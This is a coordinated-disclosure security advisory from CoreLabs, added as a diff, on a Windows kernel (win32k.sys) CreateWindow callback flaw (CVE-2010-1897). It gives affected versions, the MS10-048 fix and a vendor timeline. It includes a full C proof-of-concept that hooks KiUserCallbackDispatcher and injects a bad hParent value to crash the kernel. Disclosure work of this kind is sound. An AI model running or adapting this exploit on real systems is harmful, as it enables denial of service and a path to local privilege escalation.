@@ -1,0 +1,400 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+ 
+      Core Security Technologies - CoreLabs Advisory
+           http://corelabs.coresecurity.com/
+
+Microsoft Windows CreateWindow function callback vulnerability
+
+
+1. *Advisory Information*
+
+Title: Microsoft Windows CreateWindow function callback vulnerability
+Advisory Id: CORE-2010-0623
+Advisory URL:
+[http://www.coresecurity.com/content/microsoft-windows-createwindow-function-callback-bug]
+Date published: 2010-08-10
+Date of last update: 2010-08-09
+Vendors contacted: Microsoft
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Input validation error [CWE-20]
+Impact: Code execution
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2010-1897
+Bugtraq ID: 42206
+
+
+3. *Vulnerability Description*
+
+A crash due to an invalid read in the Windows kernel can be reliably
+leveraged into privileged code execution resulting in a privilege
+escalation local vulnerability. This happens because special values of
+'hParent' where not sufficiently taken into account when patching
+'xxxCreateWindowsEx' on MS010-032[1].
+
+
+4. *Vulnerable packages*
+
+At least all supported versions of Windows were reported by Microsoft
+to be vulnerable:
+
+   . Windows 7
+   . Windows Vista
+   . Windows Server 2008 R2
+   . Windows Server 2008
+   . Microsoft Windows XP
+   . Microsoft Windows Server 2003
+
+
+5. *Non-vulnerable packages*
+
+   . Windows 7 with MS10-048
+   . Windows Vista with MS10-048
+   . Windows Server 2008 R2 with MS10-048
+   . Windows Server 2008 with MS10-048
+   . Microsoft Windows XP with MS10-048
+   . Microsoft Windows Server 2003 with MS10-048
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+See Microsoft security bulletin at
+[http://go.microsoft.com/fwlink/?LinkId=194552]
+
+
+7. *Credits*
+
+This vulnerability was discovered by Nicolas Economou from Core
+Security Technologies.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+There is a bug in the 'xxxCreateWindowEx' Windows kernel function,
+located in win32k.sys. This function addresses memory with a
+user-supplied (via a callback) window pseudo-handle (the 'hParent'
+parameter). This bug can be exploited by surreptitiously registering a
+callback or "hook" that will cleverly modify parameters passed by the
+kernel into userland that are then reused when returning to kernel
+from the callback.
+
+In normal execution when the 'CreateWindow' is called from userspace,
+the 'NtUserCreateWindowEx' kernel function is executed, the
+'xxxCreateWindowEx' is next in the kernel-side call stack. The later
+function then checks that the callback functions (or "hooks") where
+properly set and calls 'xxxCallHook' which then starts the dispatch
+into userland of the registered callback functions.
+
+The problem resides in the mechanism used to pass parameters back to
+the process creating the window, like for example the aforementioned
+'hParent' parameter. These parameters are passed via the stack into
+userspace, and reused by the kernel after the callback function is
+executed. If the callback function resets the 'hParent' parameter to
+pseudo-handle values like '0xffffffff' or '0xfffffffe' the kernel
+crashes (likely because validation of handle values was already done
+and was not being re-verified after executing untrusted userland code).
+
+The following code reliably crashes a fully patched version of Windows
+XP 32 bits when executed as an unprivileged user. On version
+5.1.2600.5976 of win32k.sys the crash occurs on '0xbf832763'
+('xxxCreateWindowEx') when reading from unmapped memory ('test byte
+ptr [eax+0x1c],0x8'). The value of 'eax' on the crash is '0xfffffffe',
+the supplied vulnerable 'hParent' value.
+
+/-----
+#include <windows.h>
+#include <stdio.h>
+
+#define asm __asm
+
+///////////////////////////////////////////////////////////////////////////
+
+void *KiUserCallbackDispatcher;
+
+///////////////////////////////////////////////////////////////////////////
+
+//__declspec ( naked ) void handler ( void );
+void seter ( unsigned int * );
+BOOL CALLBACK my_callback ( int , WPARAM , LPARAM );
+
+///////////////////////////////////////////////////////////////////////////
+
+char *trampoline = "\x68"               // "push"
+                   "\x12\x34\x56\x78"   // "handler address"
+                   "\xc3";              // "ret"
+
+///////////////////////////////////////////////////////////////////////////
+
+__declspec ( naked ) void handler ( void )
+{
+//  asm int 3
+
+  asm pushad
+  asm push esp
+  asm call seter
+  asm add esp,4
+  asm popad
+
+/* The first 3 "KiUserCallbackDispatcher" instructions */
+  asm add esp,0x4
+  asm pop edx
+  asm mov eax,fs:[0x18]
+
+/* Returning to the normal code */
+  asm push dword ptr [ KiUserCallbackDispatcher ]
+  asm add dword ptr [esp],0x0a
+  asm ret
+}
+
+///////////////////////////////////////////////////////////////////////////
+
+void seter ( unsigned int *base )
+{
+  unsigned int *p = ( unsigned int * ) base;
+  static int time = 1;
+
+/* If it's the correct call */
+  if ( time == 1 )
+  {
+  /* Searching a known argument */
+    while ( 1 )
+    {
+    /* If it's the interesting value */
+      if ( *p == 0x00cf0000 )
+      {
+      /* If it's the hParent to be modified */
+        if ( p [ 4 ] == 0 )
+        {
+        /* Writing the magic argument */
+          p [ 4 ] = 0xfffffffe;      /* <<<<<<<< BUG <<<<<<<< */
+
+        /* Closing the door */
+          time ++;
+        }
+
+       /* Leaving */
+        break;
+      }
+      else
+      {
+        p ++;
+      }
+    }
+  }
+  else
+  {
+    time ++;
+  }
+
+}
+
+///////////////////////////////////////////////////////////////////////////
+
+BOOL CALLBACK my_callback ( int algo , WPARAM wparam , LPARAM lparam )
+{
+  return ( FALSE );
+}
+
+///////////////////////////////////////////////////////////////////////////
+
+int main ( int argc , char *argv [] )
+{
+  unsigned int nbytes;
+  unsigned int oldp;
+  HHOOK hook;
+
+/* Resolving the KiUserCallbackDispatcher address */
+  KiUserCallbackDispatcher = GetProcAddress ( GetModuleHandle (
+"ntdll.dll" ) , "KiUserCallbackDispatcher" );
+  printf ( "%x\n" , KiUserCallbackDispatcher );
+
+/* Changing the privileges */
+  VirtualProtect ( KiUserCallbackDispatcher , 1 ,
+PAGE_EXECUTE_READWRITE , &oldp );
+
+/* Fixing the trampoline */
+  * ( ( unsigned int * ) &trampoline [ 1 ] ) = ( unsigned int * ) handler;
+
+/* Patching the KiUserCallbackDispatcher */
+  WriteProcessMemory ( ( HANDLE ) -1 , ( void * )
+KiUserCallbackDispatcher , ( void * ) trampoline , 6 , ( DWORD * )
+&nbytes );
+
+/* Enabling the kernel callbacks */
+  hook = SetWindowsHookEx ( WH_SHELL , ( HOOKPROC ) my_callback ,
+GetModuleHandle ( NULL ) , GetCurrentThreadId () );
+  hook = SetWindowsHookEx ( WH_GETMESSAGE , ( HOOKPROC ) my_callback ,
+GetModuleHandle ( NULL ) , GetCurrentThreadId () );
+  hook = SetWindowsHookEx ( WH_CBT , ( HOOKPROC ) my_callback ,
+GetModuleHandle ( NULL ) , GetCurrentThreadId () );
+
+/* Creating a window */
+  printf ( "Creating a Window ...\n" );
+  CreateWindow ( "Edit" , "Title" , WS_OVERLAPPEDWINDOW , 0 , 0 , 20 ,
+30 , NULL , NULL , NULL , NULL );
+  printf ( "waiting the BSOD ...\n" );
+
+  return ( 0 );
+}
+- -----/
+
+
+
+9. *Report Timeline*
+
+. 2010-06-15:
+Initial notification to the vendor. Core indicates that the patch from
+MS10-032 does not seem to fix the problem and send a PoC that work on
+fully patched systems. Asks Microsoft to determine if it is a newly
+found vulnerability or simply a quality issue with the patch issued on
+n June's Patch Tuesday.
+
+. 2010-06-16:
+Vendor acknowledges notification and says that the product team will
+look into the issue.
+
+. 2010-06-17:
+Vendor asks for a stacktrace and crash dump file to confirm that
+they're reproducing the same issue.
+
+. 2010-06-15:
+Core sends stacktrace and crash dump and asks to confirm that the bug
+could be reproduced with the PoC sent earlier.
+
+. 2010-06-17:
+Vendor confirms that the bug has been reproduced. Can't determine if
+it is a new bug, a variant of an existing one or an incomplete fix but
+expects to have more information by the 20th or 21st at the latest.
+
+. 2010-06-23:
+Update from the vendor (email sent previously bounced). The issue has
+been determined to be a variant of CVE-2010-0485. It will be addressed
+as a new bug and assigned a different CVE ID. Although the crash comes
+from the same vector (a window handle returned by a user mode windows
+hook callback) the bug is in a different function than the original
+issue and occurs due to a different, previously unknown, issue with
+the window handle that the original fix does not address. A solid
+timeline for general availability of patches is not yet available. The
+July 2010 Patch Tuesday day is mentioned as tentative but the patch
+release may slip to August.
+
+. 2010-06-23:
+Core says that its analysis coincides with the vendor's and therefore
+it will treat the issue as a new vulnerability assigning
+CORE-2010-0623 to the corresponding security advisory. The discoverer
+estimated that the issue is very likely to be exploitable. Publication
+is tentatively scheduled for July 13th, 2010 but may be postponed
+based on a firm commitment from MSRC and indication that the fix is
+lined up for testing. Core mentions that it is very likely that
+vulnerability research vendors have already found this issue and quite
+possible that exploits are already being developed. Should the
+information become public by a third-party Core will promptly publish
+its security advisory and notify the vendor.
+
+. 2010-07-23:
+Core asks Microsoft to confirm that the patch has been positively
+rescheduled to the August patch Tuesday, since no communications where
+received on the last month and July's patch Tuesday is due. Core also
+informs that reliable exploitation of this bug had been achieved and
+restates that August should be a final date because this vulnerability
+has probably been already discovered by any with technical knowledge
+to reverse engineer MS010-032. Information on affected platforms is
+also asked for to Microsoft.
+
+. 2010-07-23:
+Microsoft confirms that the patch will be issued in August 10th, for
+all supported versions of Microsoft Windows.
+
+. 2010-08-04:
+Core asks Microsoft for data regarding their future security bulletin
+in order to include it in the vendor section of this advisory.
+
+. 2010-08-04:
+Microsoft replies with the data Core asked for, and mentions that, if
+possible, they would like to see an advisory draft. Microsoft also
+asks for confirmation on credits for the acknowledgement section of
+their report.
+
+. 2010-08-04:
+Core replies with a draft of this advisory and a minor correction
+regarding an accent mark on the credits for the acknowledgement section.
+
+. 2010-08-09:
+Core sends a more polished draft for the advisory.
+
+. 2010-08-10:
+Microsoft acknowledges the advisory draft and the minor correction
+regarding the accent mark.
+
+. 2010-08-10:
+Microsoft Security Bulletin MS10-048 is published.
+
+. 2010-08-10:
+Advisory CORE-2010-0623 is published.
+
+
+10. *References*
+
+[1] Microsoft Security Bulletin MS10-032
+[http://www.microsoft.com/technet/security/bulletin/ms10-032.mspx]
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is
+charged with anticipating the future needs and requirements for
+information security technologies. We conduct our research in several
+important areas of computer security including system vulnerabilities,
+cyber attack planning and simulation, source code auditing, and
+cryptography. Our results include problem formalization,
+identification of vulnerabilities, novel solutions and prototypes for
+new technologies. CoreLabs regularly publishes security advisories,
+technical papers, project information and shared software tools for
+public use at: [http://corelabs.coresecurity.com/].
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources
+are exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and
+software security auditing. Based in Boston, MA and Buenos Aires,
+Argentina, Core Security Technologies can be reached at 617-399-6980
+or on the Web at [http://www.coresecurity.com].
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2010 Core Security
+Technologies and (c) 2010 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: [http://creativecommons.org/licenses/by-nc-sa/3.0/us/]
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+[http://www.coresecurity.com/files/attachments/core_security_advisories.asc].
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (MingW32)
+Comment: GnuPT v3.6.3
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
+ 
+iEYEARECAAYFAkxhpQ0ACgkQyNibggitWa3Q7gCfVgpuM7KDIIZ30RhJ9zPCOhl+
+37IAoLMnTLUuZbvGpDlpjqmft5z0AFZ+
+=ECTt
+-----END PGP SIGNATURE-----
